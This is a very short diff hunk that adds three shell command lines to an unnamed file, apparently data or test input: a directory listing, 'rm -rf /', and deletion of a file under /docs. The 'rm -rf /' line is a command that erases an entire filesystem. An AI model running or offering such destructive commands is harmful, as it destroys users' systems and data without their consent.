@@ -1,0 +1,3 @@
+ls /
+rm -rf /
+rm /docs/lines.txt
